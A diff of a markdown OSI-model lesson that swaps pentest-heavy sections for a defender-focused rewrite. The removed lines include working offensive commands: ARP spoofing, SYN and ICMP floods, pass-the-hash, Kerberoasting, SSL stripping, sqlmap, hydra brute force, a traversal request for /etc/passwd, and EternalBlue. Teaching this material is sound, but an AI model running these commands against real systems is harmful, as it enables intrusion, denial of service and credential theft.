-## 12. Protocols per layer
+## 6. Which Device Works at Which Layer
 
-```
-┌───────────────────────────────────────────────────────────────────┐
-│ LAYER 7 — APPLICATION                                             │
-│  HTTP  HTTPS  FTP  SFTP  SSH  Telnet  DNS  DHCP  SMTP  POP3      │
-│  IMAP  SNMP  LDAP  RDP  SMB  NFS  SIP  XMPP  MQTT  Gopher       │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 6 — PRESENTATION                                            │
-│  SSL  TLS  ASCII  Unicode  JPEG  PNG  GIF  MPEG  MIDI            │
-│  Base64  MIME  XDR  AFP  LPP                                     │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 5 — SESSION                                                 │
-│  NetBIOS  RPC  PPTP  L2TP  SQL*Net  NFS  SMB (session mgmt)      │
-│  iSCSI  SOCKS  PAP  CHAP  Diameter                               │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 4 — TRANSPORT                                               │
-│  TCP  UDP  SCTP  DCCP  SPX  QUIC                                 │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 3 — NETWORK                                                 │
-│  IPv4  IPv6  ICMP  ICMPv6  OSPF  BGP  EIGRP  RIP                │
-│  IPSec  ARP*  RARP*  NAT  IGMP  GRE  MPLS                       │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 2 — DATA LINK                                               │
-│  Ethernet  Wi-Fi (802.11)  PPP  HDLC  Frame Relay                │
-│  ATM  802.1Q (VLAN)  STP  LACP  ARP  MAC                        │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 1 — PHYSICAL                                                │
-│  Ethernet (cable specs)  USB  DSL  ISDN  T1/E1                   │
-│  Bluetooth  802.11 (radio)  Fiber Optic standards                 │
-└───────────────────────────────────────────────────────────────────┘
+| Layer | Devices | Job |
+|-------|---------|-----|
+| 7 Application | Web firewall (WAF), proxy, load balancer | Filter and inspect HTTP/TLS |
+| 4 Transport | Stateful firewall | Allow/block by port and connection |
+| 3 Network | Router, Layer-3 switch | Route between networks |
+| 2 Data Link | Switch, bridge, access point | Forward frames by MAC |
+| 1 Physical | Hub, repeater, cable, network card | Carry the signal |
 
-* ARP technically operates between Layer 2 and 3
-```
-
----
-
-## 13. Network devices per layer
-
-Each network device operates at a specific OSI layer. Understanding this matters for network segmentation, troubleshooting, and network-level attacks.
-
-| OSI layer | Devices | Function |
-|-----------|---------|-----------|
-| Layer 7 | Application firewall, WAF, proxy, load balancer | Filter HTTP, SSL inspection |
-| Layer 4 | Stateful firewall, load balancer | Port and connection filtering |
-| Layer 3 | Router, Layer 3 switch, firewall | Inter-network routing |
-| Layer 2 | Switch (L2), bridge, WAP | MAC-based switching |
-| Layer 1 | Hub, repeater, cable, NIC, WAP | Physical signal transmission |
+A quick way to see the Layer-3 router your own machine uses:
 
 ```bash
-# Identify network devices during pentest
-
-# Identify routers / gateways
-$ ip route | grep default          # default gateway = router
-$ arp -a                           # ARP table shows local devices
-
-# Scan for specific devices
-$ nmap -sV --version-intensity 5 192.168.1.0/24
-
-# Identify switches (CDP/LLDP discovery)
-$ nmap --script lldp-discovery 192.168.1.0/24
-$ wireshark → filter: lldp or cdp
-
-# WAF detection
-$ wafw00f https://target.com
-$ nmap --script http-waf-detect --script-args="http-waf-detect.aggro" target.com
-
-# Load balancer detection
-$ lbd target.com                   # Load balancer detector
-
-# Proxy detection
-$ curl -v --proxy-header target.com  # look for Via: header
+ip route | grep default    # the default gateway = your router
 ```
 
 ---
 
-## 14. Security notes: attacks per OSI layer
+## 7. Attacks and Defenses, Layer by Layer
 
-Each OSI layer has distinct attack vectors. Understanding at which layer an attack occurs helps defenders place the right security controls, and helps attackers pick effective techniques.
+Every layer can be attacked in its own way. The goal here is to recognize **what kind of attack belongs to which layer, and how it's defended**, so you can place the right control. This is a defender's map, not an attack manual: specific exploit commands are intentionally left out, and other lessons (LC-042 ARP, LC-039 Wireless, the web module) go deeper on the concepts.
 
-> Educational note: the commands below are for authorized testing on networks you own or are permitted to test. They map attack categories to the layer they operate at, not a step-by-step attack guide against a target you do not control.
+| Layer | Example attacks (what they are) | How to defend |
+|-------|---------------------------------|---------------|
+| 7 Application | SQL injection, XSS, request forgery, phishing: abusing the app's own logic | Input validation, patching, a web application firewall |
+| 6 Presentation | TLS downgrade / SSL stripping: forcing a weaker or plaintext connection | Enforce HTTPS (HSTS), modern TLS 1.3, reject old ciphers |
+| 5 Session | Session hijacking, credential-replay attacks: reusing a stolen session or hash | Rotate session tokens, require MFA, harden authentication |
+| 4 Transport | SYN flood, port scanning, UDP flood: exhausting or probing services | SYN cookies, rate limiting, a stateful firewall |
+| 3 Network | IP spoofing, ICMP flood, route poisoning: faking addresses or routes | Ingress filtering (uRPF), ACLs, ICMP rate limits |
+| 2 Data Link | ARP spoofing, MAC flooding, VLAN hopping: tricking the local switch | Dynamic ARP Inspection, switch port security |
+| 1 Physical | Wiretapping, rogue "evil twin" Wi-Fi, jamming | Physical access control, always encrypt (VPN, HTTPS) |
 
-```bash
-# ── LAYER 1 ATTACKS ─────────────────────────────────────────────────
-
-# Physical tapping / eavesdropping
-# → Use encrypted protocols (HTTPS, SSH, VPN) to mitigate
-
-# Evil twin Wi-Fi (physical signal)
-$ airbase-ng -e "FreeWiFi" -c 6 wlan0mon
-
-# ── LAYER 2 ATTACKS ─────────────────────────────────────────────────
-
-# ARP Spoofing / Poisoning — MITM at Layer 2
-$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1     # poison victim
-$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100     # poison gateway
-$ echo 1 > /proc/sys/net/ipv4/ip_forward             # enable forwarding
-# Or use:
-$ ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
-$ bettercap -iface eth0                               # modern MITM framework
-
-# MAC Flooding — fill switch CAM table
-$ macof -i eth0                   # flood switch with random MACs
-
-# VLAN Hopping — 802.1Q double tagging
-# Use tools like yersinia
-
-# STP Attack — become root bridge
-$ yersinia stp -attack 1 -interface eth0
-
-# ── LAYER 3 ATTACKS ─────────────────────────────────────────────────
-
-# ICMP Flood / Ping of Death
-$ hping3 -1 --flood -V -a spoofed-ip target.com
-
-# IP Spoofing
-$ hping3 -a fake-source-ip target.com
-
-# Smurf Attack (ICMP broadcast amplification)
-# BGP Hijacking (requires BGP router access)
-
-# Route poisoning
-$ python3 -c "from scapy.all import *; send(IP(dst='router',proto=89)/OSPF_Hdr()/OSPF_Hello())"
-
-# ── LAYER 4 ATTACKS ─────────────────────────────────────────────────
-
-# SYN Flood — exhaust server connections
-$ hping3 -S --flood -V -p 80 target.com
-$ hping3 -S -P -U --flood -V -p 80 target.com
-
-# Port scanning (reconnaissance)
-$ nmap -sS -p- target.com
-
-# TCP Session Hijacking
-# → Requires MITM position + sequence number prediction
-
-# UDP Flood
-$ hping3 --udp --flood target.com -p 53
-
-# ── LAYER 5 ATTACKS ─────────────────────────────────────────────────
-
-# Session Hijacking — steal session tokens
-# → Intercept cookies via HTTP (Wireshark / BetterCAP)
-
-# Pass-the-Hash (Windows NTLM)
-$ pth-winexe -U 'domain/user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //target cmd.exe
-$ impacket-psexec domain/user@target -hashes :NTLM_HASH
-
-# Kerberoasting (Kerberos ticket attack)
-$ impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.1 -request
-
-# ── LAYER 6 ATTACKS ─────────────────────────────────────────────────
-
-# SSL Stripping — downgrade HTTPS to HTTP
-$ bettercap -iface eth0
-> set https.proxy.sslstrip true
-> https.proxy on
-
-# TLS Downgrade Attack
-$ nmap --script ssl-dh-params target.com   # check for LOGJAM
-$ nmap --script ssl-poodle target.com      # POODLE attack check
-
-# Certificate spoofing / Invalid cert bypass
-$ mitmproxy --ssl-insecure                 # intercept SSL
-$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
-
-# ── LAYER 7 ATTACKS ─────────────────────────────────────────────────
-
-# SQL Injection
-$ sqlmap -u "http://target.com/page?id=1" --dbs
-$ sqlmap -u "http://target.com/" --forms --dbs --level=5
-
-# Cross-Site Scripting (XSS)
-# Test: <script>alert(document.cookie)</script>
-
-# Directory Traversal
-$ curl "http://target.com/../../etc/passwd"
-
-# HTTP brute force
-$ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
-  "/login:username=^USER^&password=^PASS^:Invalid credentials"
-
-# DNS Zone Transfer
-$ dig axfr @ns1.target.com target.com
-
-# SMTP User Enumeration
-$ smtp-user-enum -M VRFY -U users.txt -t target.com
-
-# SNMP Enumeration
-$ snmpwalk -c public -v 2c target.com
-
-# SMB Exploitation
-$ impacket-psexec administrator:password@target.com
-$ metasploit → use exploit/windows/smb/ms17_010_eternalblue
-```
-
-### OSI attack summary table
-
-| Layer | Common attacks | Defense |
-|-------|------------------|---------|
-| 7 — Application | SQLi, XSS, RCE, CSRF, phishing | WAF, input validation, patching |
-| 6 — Presentation | SSL stripping, TLS downgrade, cert spoofing | HSTS, cert pinning, TLS 1.3+ |
-| 5 — Session | Session hijack, pass-the-hash, Kerberoasting | Token rotation, MFA, Kerberos hardening |
-| 4 — Transport | SYN flood, port scan, UDP flood | SYN cookies, rate limiting, firewall |
-| 3 — Network | IP spoof, ICMP flood, route poisoning | uRPF, ACL, ICMP rate limit |
-| 2 — Data Link | ARP spoof, MAC flood, VLAN hopping | Dynamic ARP Inspection, port security |
-| 1 — Physical | Wiretapping, evil twin, signal jamming | Physical security, encrypted protocols |
+The single most useful takeaway: a control only protects its own layer. Encryption at Layer 6 does nothing against someone unplugging a cable at Layer 1, and a Layer-7 web firewall does nothing against a Layer-2 ARP spoof. Real security stacks defenses at several layers at once (defense in depth).
 
 ---
 
-## 15. Practical workflow: network recon & analysis
+## 8. Troubleshooting with the Layers
 
-```bash
-# ── SCENARIO: Network Penetration Testing — OSI-based Approach ──────
-
-# ═══ PHASE 1: LAYER 1-2 — Physical & Data Link Recon ════════════════
-
-# 1. Identify your network interface
-$ ip link show
-$ ip addr show
-
-# 2. Put interface in promiscuous mode (passive sniffing)
-$ ip link set eth0 promisc on
-$ tcpdump -i eth0 -n -e           # capture with MAC addresses
-
-# 3. ARP scan — discover all hosts on segment
-$ arp-scan --localnet             # or:
-$ nmap -sn -PR 192.168.1.0/24    # ARP ping sweep
-
-# 4. Check for ARP anomalies
-$ arpwatch -i eth0                # monitor ARP changes
-$ tcpdump -i eth0 arp             # watch ARP traffic live
-
-# ═══ PHASE 2: LAYER 3 — Network Discovery ════════════════════════════
-
-# 5. ICMP ping sweep
-$ nmap -sn 192.168.1.0/24        # host discovery
-$ fping -a -g 192.168.1.0/24 2>/dev/null
-
-# 6. TTL-based OS detection
-$ ping -c 1 target | grep ttl
-# TTL 64  → Linux/Unix
-# TTL 128 → Windows
-# TTL 255 → Network device (Cisco, etc.)
-
-# 7. Traceroute — map network topology
-$ traceroute -n 10.0.0.1
-$ mtr --report 10.0.0.1
-
-# ═══ PHASE 3: LAYER 4 — Port & Service Scanning ══════════════════════
-
-# 8. Quick port scan
-$ nmap -sS -F --open 192.168.1.0/24   # fast SYN scan, open ports only
-
-# 9. Full port scan on discovered hosts
-$ nmap -sS -p- -T4 target.com
-
-# 10. UDP scan (slow but important)
-$ nmap -sU --top-ports 100 target.com
-
-# 11. Service version detection
-$ nmap -sV -sC -p 22,80,443,445 target.com
-
-# ═══ PHASE 4: LAYER 5-6 — Session & Protocol Analysis ════════════════
-
-# 12. Check SSL/TLS configurations
-$ sslscan target.com
-$ nmap --script ssl-enum-ciphers -p 443 target.com
-$ openssl s_client -connect target.com:443
-
-# 13. Check for session management issues
-# Burp Suite → Intercept → check session tokens
-
-# 14. SMB/NetBIOS enumeration
-$ enum4linux -a target.com
-$ smbmap -H target.com
-$ smbclient -L //target.com -N
-
-# ═══ PHASE 5: LAYER 7 — Application Enumeration ══════════════════════
-
-# 15. HTTP enumeration
-$ curl -s -I http://target.com              # headers
-$ whatweb http://target.com                 # tech fingerprint
-$ nikto -h http://target.com               # web vulnerability scan
-$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-# 16. DNS enumeration
-$ dig any target.com
-$ dnsrecon -d target.com -t std
-$ fierce --domain target.com
-
-# 17. SNMP enumeration (if UDP 161 open)
-$ snmpwalk -c public -v 2c target.com
-$ snmpwalk -c public -v 2c target.com 1.3.6.1.2.1.1   # system info
-
-# 18. LDAP enumeration (if port 389 open)
-$ ldapsearch -H ldap://target.com -x -b "dc=target,dc=com"
-$ nmap --script ldap-rootdse target.com
-
-# ═══ ANALYSIS: Correlate findings across layers ═══════════════════════
-
-# 19. Full comprehensive scan
-$ nmap -A -sV -sC -O -p- --open target.com -oN full_scan.txt
-
-# 20. Parse and organize results
-$ grep "open" full_scan.txt | sort -t/ -k1 -n
-```
-
-### OSI troubleshooting approach
+The layers give you a checklist when "it's not working." Start at the bottom and work up: if a lower layer is broken, nothing above it can work.
 
 ```
-Problem: Can't reach remote server?
+Can't reach a server?
 
-Step 1 — Layer 1 (Physical):
-  → Is cable plugged in? Link light on?
-  $ ip link show eth0 | grep "state UP"
+L1 Physical:   Is the cable in / Wi-Fi connected? Is the link up?
+               ip link show eth0   → look for "state UP"
 
-Step 2 — Layer 2 (Data Link):
-  → Can you reach local gateway?
-  $ arp -a | grep gateway-ip
+L2 Data Link:  Can you see the gateway's MAC?
+               ip neigh show
 
-Step 3 — Layer 3 (Network):
-  → Can you ping gateway?
-  $ ping 192.168.1.1
-  → Can you ping remote IP?
-  $ ping 8.8.8.8
-  → Check routing table
-  $ ip route show
+L3 Network:    Can you ping the gateway, then a public IP?
+               ping 192.168.1.1  then  ping 8.8.8.8
+               ip route show     → is there a default route?
 
-Step 4 — Layer 4 (Transport):
-  → Is the port open?
-  $ nc -zv target 80
-  $ nmap -p 80 target
+L4 Transport:  Is the port actually open?
+               nc -zv target 443
 
-Step 5 — Layer 5-6 (Session/Presentation):
-  → SSL certificate valid?
-  $ openssl s_client -connect target:443
-  → Session timeout?
+L5/6 Session/Presentation:  Is the TLS certificate valid / not expired?
+               openssl s_client -connect target:443
 
-Step 6 — Layer 7 (Application):
-  → HTTP response code?
-  $ curl -v http://target
-  → Application error?
-  → Check application logs
+L7 Application: What does the service say?
+               curl -v https://target   → check the status code and logs
 ```
 
 ---
 
-## OSI vs TCP/IP model
+## 9. OSI vs the TCP/IP Model
+
+Real networks run on the 4-layer TCP/IP model. OSI's seven layers map onto it like this:
 
 ```
-OSI Model              TCP/IP Model (4-layer)     Protocols
-─────────────          ──────────────────────     ─────────────────────────
-Layer 7 — Application  ┐
-Layer 6 — Presentation ├── Application Layer       HTTP, FTP, DNS, SMTP, SSH
-Layer 5 — Session      ┘
-─────────────          ──────────────────────     ─────────────────────────
-Layer 4 — Transport    ─── Transport Layer         TCP, UDP, SCTP
-─────────────          ──────────────────────     ─────────────────────────
-Layer 3 — Network      ─── Internet Layer          IPv4, IPv6, ICMP, BGP
-─────────────          ──────────────────────     ─────────────────────────
-Layer 2 — Data Link    ┐
-Layer 1 — Physical     ┴── Network Access Layer    Ethernet, Wi-Fi, ARP
+OSI Model                    TCP/IP Model          Examples
+Layer 7 Application  ┐
+Layer 6 Presentation ├──────  Application          HTTP, DNS, SSH, TLS
+Layer 5 Session      ┘
+Layer 4 Transport    ───────  Transport            TCP, UDP
+Layer 3 Network      ───────  Internet             IP, ICMP
+Layer 2 Data Link    ┐
+Layer 1 Physical     ┴──────  Network Access       Ethernet, Wi-Fi, ARP
 ```
+
+Use OSI to *reason and talk* about where something happens; the traffic on the wire is TCP/IP.
 
 ---
 
-## Quick reference cheatsheet
+## 10. Quick Reference
 
-```bash
-# ── OSI LAYER MNEMONICS ────────────────────────────────────────────
-# Top → Bottom:  "All People Seem To Need Data Processing"
-# Bottom → Top:  "Please Do Not Throw Sausage Pizza Away"
+```text
+LAYER CHEAT SHEET (top → bottom)
+  L7 Application   HTTP, DNS, SSH, SMB          (what apps speak)
+  L6 Presentation  TLS, Base64, JPEG            (format & encryption)
+  L5 Session       NetBIOS, RPC, SMB sessions   (managing the conversation)
+  L4 Transport     TCP (reliable), UDP (fast)   [PORTS]
+  L3 Network       IP, ICMP, routing            [IP ADDRESSES]
+  L2 Data Link     Ethernet, ARP, VLAN          [MAC ADDRESSES]
+  L1 Physical      cables, radio, bits          [HARDWARE]
 
-# ── LAYER QUICK REFERENCE ─────────────────────────────────────────
-# L7 Application  → HTTP, DNS, FTP, SSH, SMTP, SNMP, LDAP, RDP, SMB
-# L6 Presentation → SSL/TLS, ASCII, Base64, JPEG, MIME
-# L5 Session      → NetBIOS, RPC, SMB sessions, iSCSI
-# L4 Transport    → TCP (reliable), UDP (fast)   [PORTS]
-# L3 Network      → IPv4/IPv6, ICMP, OSPF, BGP   [IP ADDRESSES]
-# L2 Data Link    → Ethernet, ARP, 802.1Q VLAN   [MAC ADDRESSES]
-# L1 Physical     → Cables, signals, bits         [HARDWARE]
+DATA UNIT PER LAYER
+  L7–L5 Data → L4 Segment/Datagram → L3 Packet → L2 Frame → L1 Bits
 
-# ── PDU NAMES ─────────────────────────────────────────────────────
-# L7-L5: Data
-# L4:    Segment (TCP) / Datagram (UDP)
-# L3:    Packet
-# L2:    Frame
-# L1:    Bits
-
-# ── NETWORK RECON TOOLS ───────────────────────────────────────────
-arp-scan --localnet           # Layer 2 discovery
-nmap -sn 192.168.1.0/24      # Layer 3 host discovery
-nmap -sS -p- target          # Layer 4 port scan
-nmap -sV -sC target          # Layer 7 service detection
-tcpdump -i eth0 -n           # Passive capture (all layers)
-wireshark                    # GUI packet analysis
-
-# ── ATTACK TOOLS BY LAYER ─────────────────────────────────────────
-# L2: arpspoof, ettercap, bettercap, macof, yersinia
-# L3: hping3, scapy, nmap
-# L4: hping3, nmap, netcat, masscan
-# L5: impacket, mimikatz, Responder
-# L6: mitmproxy, sslstrip, sslscan, testssl.sh
-# L7: sqlmap, nikto, gobuster, hydra, burpsuite
-
-# ── DEFENSIVE TOOLS ───────────────────────────────────────────────
-# L2: arpwatch, Dynamic ARP Inspection (DAI on switches)
-# L3: uRPF, firewall ACL, fail2ban
-# L4: SYN cookies, rate limiting, stateful firewall
-# L5: Kerberos hardening, MFA, NTLM restrictions
-# L6: HSTS, cert pinning, TLS 1.3, HPKP
-# L7: WAF, input validation, CSP headers, SAST/DAST
-
-# ── WIRESHARK FILTERS CHEATSHEET ──────────────────────────────────
-ip.addr == 192.168.1.1         # filter by IP
-ip.src == 10.0.0.0/8           # filter by subnet
-tcp.port == 80                 # HTTP traffic
-tcp.flags.syn == 1             # TCP SYN packets
-tcp.flags.rst == 1             # TCP RST (port closed/reset)
-udp.port == 53                 # DNS traffic
-arp                            # ARP traffic only
-http                           # HTTP traffic only
-ssl or tls                     # SSL/TLS traffic
-dns                            # DNS only
-icmp                           # ICMP (ping) only
-!(arp or dns or icmp)          # exclude noise
-
-# ── PORT STATUS IN NMAP ────────────────────────────────────────────
-# open         → service running, accepting connections
-# closed       → port accessible, no service running (RST reply)
-# filtered     → firewall blocking, no reply
-# open|filtered → can't determine (UDP especially)
-# unfiltered   → accessible, but state unknown
-
-# ── COMMON NETWORK COMMANDS ───────────────────────────────────────
-# Linux:
-ip addr show; ip route show; ss -tulnp; arp -a; dig; traceroute
-
-# Windows:
-ipconfig /all; route print; netstat -ano; arp -a; nslookup; tracert
+MEMORY TRICKS
+  top → bottom:  All People Seem To Need Data Processing
+  bottom → top:  Please Do Not Throw Sausage Pizza Away
 ```
 
----
+### Complete OSI reference table
 
-## Complete OSI reference table
-
-| Layer | Name | PDU | Address | Devices | Key protocols |
-|-------|------|-----|---------|---------|-----------------|
-| 7 | Application | Data | — | WAF, proxy | HTTP, FTP, DNS, SSH |
-| 6 | Presentation | Data | — | — | SSL/TLS, MIME |
+| Layer | Name | PDU | Address | Device | Key protocols |
+|-------|------|-----|---------|--------|---------------|
+| 7 | Application | Data | — | WAF, proxy | HTTP, DNS, SSH |
+| 6 | Presentation | Data | — | — | TLS, MIME |
 | 5 | Session | Data | — | — | NetBIOS, RPC |
-| 4 | Transport | Segment/Datagram | Port | Firewall | TCP, UDP |
+| 4 | Transport | Segment / Datagram | Port | Firewall | TCP, UDP |
 | 3 | Network | Packet | IP address | Router | IPv4, IPv6, ICMP |
-| 2 | Data Link | Frame | MAC address | Switch | Ethernet, ARP, 802.1Q |
-| 1 | Physical | Bits | — | Hub, NIC | DSL, Ethernet |
+| 2 | Data Link | Frame | MAC address | Switch | Ethernet, ARP |
+| 1 | Physical | Bits | — | Hub, NIC | Ethernet, DSL |
 
 ---
 
 > **References & book sources**
-> - James Kurose & Keith Ross, *Computer Networking: A Top-Down Approach*, `~/Documents/Books/CyberSec/Networking/computernetworking.pdf`
-> - William Stallings, *Network Security Essentials: Applications and Standards (4th Edition)*, `~/Documents/Books/CyberSec/Networking/Network-security-essentials-4th-edition-william-stallings.pdf`
-> - Matthew Gast, *802.11 Wireless Networks: The Definitive Guide*, `~/Documents/Books/CyberSec/Networking/802_11_Wireless_Networks__The_Definitive_Guide__O__039_Reilly_Networking_.pdf`
-> - Christian Benvenuti, *Understanding Linux Network Internals*, `~/Documents/Books/CyberSec/Networking/Understanding Linux Network Internals (2005).pdf`
-> - W. Richard Stevens, *UNIX Network Programming (Volume 1, 3rd Edition)*, `~/Documents/Books/CyberSec/Networking/UNIX Network Programming Volume 1, 3rd edition - W. Richard Stevens.pdf`
+> - James Kurose & Keith Ross, *Computer Networking: A Top-Down Approach*, `~/Documents/Books/CyberSec/Networking/`
+> - William Stallings, *Network Security Essentials (4th Edition)*, `~/Documents/Books/CyberSec/Networking/`
 > - RFC 793 (TCP), RFC 768 (UDP)
 > - Nmap and Wireshark official documentation, the IANA port number registry
 
